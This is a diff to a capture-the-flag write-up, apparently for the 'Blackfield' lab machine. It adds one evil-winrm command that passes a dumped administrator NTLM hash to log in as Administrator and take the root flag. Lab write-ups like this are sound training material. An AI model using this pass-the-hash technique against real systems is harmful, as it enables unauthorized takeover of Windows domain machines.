@@ -107,7 +107,7 @@
 
 16. Passing the Hash for the administrator allows us to evil-winrm into the machine as Administrator and get the root flag!
 
-``
+`evil-winrm -i blackfield.local -u administrator -H $(cat administrator_ntds.hash)`
 
 <img width="527" height="246" alt="image" src="https://github.com/user-attachments/assets/2bbdc903-5cab-45c2-8003-aeca8e1a6eab" />
 
